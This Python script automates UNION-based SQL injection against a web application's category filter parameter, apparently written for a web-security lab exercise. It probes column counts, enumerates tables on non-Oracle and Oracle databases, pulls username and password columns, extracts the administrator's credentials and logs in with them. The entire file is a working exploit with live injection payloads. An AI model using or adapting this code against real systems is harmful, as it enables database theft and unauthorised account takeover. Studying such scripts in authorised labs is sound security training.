import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def noofcolumns(fullurl):
    #find no of columns
    payload = "'+UNION+SELECT"
    payload1 = "--"
    for i in range(1,10):
        if (i == 1):
            payload2 = payload + "+NULL"
        else:
            payload2 = payload2 + "," + "NULL"
        fullpayload = payload2 + payload1
        fullurlpayload = fullurl+fullpayload
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if r.status_code == 200:
            return i, payload2



def columnsarestr(fullurl):
    #find if columns are string
    i, payload = noofcolumns(fullurl)
    print("The Number of columns is ", i)
    payloadstr = "'abc'"
    payload4 = "--"
    payload1, payload2 = payload[:len(payload)//2+3], payload[len(payload)//2+3:]
    list_p = payload2.replace(","," ").split()
    for j in range(0,i):
        list_p[j] = payloadstr
        payload3 = (", ").join(list_p)
        fullpayload = payload1 + payload3
        fullurlpayload = fullurl + fullpayload + payload4
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if(r.status_code == 500):
            list_p[j] = "NULL"
        else:
            print("Columns ",j+1, "is a string")


def getCSRF(y):
    soup = BeautifulSoup(y.text,'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def loginasadmin(url, username, password):
    #login as administrator
    uri = "/login"
    fullurl2 = url + uri
    w = s.get(fullurl2, verify=False, proxies=proxies)
    csrf = getCSRF(w)
    data = {
        'csrf': csrf,
        'username': username,
        'password': password

    }
    v = s.post(fullurl2, verify=False, proxies=proxies, data=data)
    if 'Log out' in v.text:
        return True
    else:
        return False

def retrieverows(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    tables = soup.find('tbody')
    rows = tables.find_all('tr')
    return rows

def retrieverowsintwo(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    tables = soup.find('tbody')
    rows1 = tables.find_all('th')
    rows2 = tables.find_all('td')
    return rows1, rows2


def tableretrieval(r, n):
    match n :
        case 1:
            rows = retrieverows(r)
            print(rows)
            for row in rows:
                data = row.get_text()
                if 'users_' in data:
                    return data

        case 2:
            rows1 = retrieverows(r)
            password = rows1[0].get_text()
            username = rows1[1].get_text()
            return username, password


        case 3:
              rows3, rows4 = retrieverowsintwo(r)
              for i in range(0,len(rows3)):
                  data1 = rows3[i].get_text()
                  data2 = rows4[i].get_text()
                  if (data1 == 'administrator'):
                      username = data1
                      password = data2
                      return username, password

        case default:
            print("Cannot process")

def tableretrievalfororacledb(r, n):
    match n :
        case 1:
            rows = retrieverows(r)
            for i in range(0,len(rows)):
                data = rows[i].get_text()
                if "USERS_" in data:
                    list_l = []
                    list_l.append(data.strip())
                    for j in range(0,len(list_l)):
                        if len(list_l[j]) == 12:
                            return list_l[j]
        case 2:
            rows1 = retrieverows(r)
            password = rows1[0].get_text()
            username = rows1[1].get_text()
            return username, password


        case 3:
              rows3, rows4 = retrieverowsintwo(r)
              for i in range(0,len(rows3)):
                  data1 = rows3[i].get_text()
                  data2 = rows4[i].get_text()
                  if (data1 == 'administrator'):
                      username = data1
                      password = data2
                      return username, password

        case default:
            print("Cannot process")


def findtablecontentinnonoracledb(fullurl, url):
    #find table contents
    payloadtables = "'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--"
    endpayload = "--"
    payloadselectedcolumns = "'+UNION+SELECT+"
    payloadselectedcolumns2 = "+FROM+"

    fullurlpayloadtables = fullurl + payloadtables
    print(fullurlpayloadtables)
    r = requests.get(fullurlpayloadtables, verify=False, proxies=proxies)
    data = tableretrieval(r, 1).strip()
    payloadcolumns = "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='{0}'".format(data)
    fullpayloadcolumns = payloadcolumns+endpayload
    print(fullpayloadcolumns)
    fullurlpayloadcolumns = fullurl + fullpayloadcolumns
    print(fullurlpayloadcolumns)

    t = requests.get(fullurlpayloadcolumns, verify=False, proxies=proxies)
    usernamefield = tableretrieval(t, 2)[0].strip()
    passwordfield = tableretrieval(t, 2)[1].strip()
    fullpayloadselected = payloadselectedcolumns + usernamefield + ","+ "+"+passwordfield + payloadselectedcolumns2 + data + endpayload
    #print(fullpayloadselected)

    fullurlpayloadselected = fullurl + fullpayloadselected
    #print(fullurlpayloadselected)
    u = requests.get(fullurlpayloadselected, verify=False, proxies=proxies)
    username = tableretrieval(u, 3)[0].strip()
    password = tableretrieval(u, 3)[1].strip()
    if loginasadmin(url, username, password):
        print("Login Bypassed.....Log In as administrator successful")
    else:
        print("Login not bypassed........Log In as administrator failed")


def findtablecontentinoracledb(fullurl, url):
       payloadtables = "'+UNION+SELECT+table_name,NULL+FROM+all_tables--"
       endpayload = "--"
       payloadselectedcolumns = "'+UNION+SELECT+"
       payloadselectedcolumns2 = "+FROM+"
       fullurlpayloadtables = fullurl + payloadtables
       print(fullurlpayloadtables)
       r = requests.get(fullurlpayloadtables, verify=False, proxies=proxies)
       data = tableretrievalfororacledb(r, 1)
       payloadcolumns = "'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='{0}'".format(data)
       fullpayloadcolumns = payloadcolumns+endpayload
       #print(fullpayloadcolumns)
       fullurlpayloadcolumns = fullurl + fullpayloadcolumns
       #print(fullurlpayloadcolumns)

       t = requests.get(fullurlpayloadcolumns, verify=False, proxies=proxies)
       usernamefield = tableretrievalfororacledb(t, 2)[0].strip()
       passwordfield = tableretrievalfororacledb(t, 2)[1].strip()
       fullpayloadselected = payloadselectedcolumns + usernamefield + ","+ "+"+passwordfield + payloadselectedcolumns2 + data + endpayload
    #print(fullpayloadselected)

       fullurlpayloadselected = fullurl + fullpayloadselected
    #print(fullurlpayloadselected)
       u = requests.get(fullurlpayloadselected, verify=False, proxies=proxies)
       username = tableretrievalfororacledb(u, 3)[0].strip()
       password = tableretrievalfororacledb(u, 3)[1].strip()
       if loginasadmin(url, username, password):
          print("Login Bypassed.....Log In as administrator successful")
       else:
        print("Login not bypassed........Log In as administrator failed")


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        uri = '/filter?category='
        fullurl = url + uri

    except IndexError:
        print("[-] Usage: python3 listingthedatabasecontentsonnon-Oracledatabases.py <url>")
        print("[-] Example: python3 listingthedatabasecontentsonnon-Oracledatabases.py https://example.com")

    s = requests.Session()
    findtablecontentinnonoracledb(fullurl, url)
    findtablecontentinoracledb(fullurl, url)





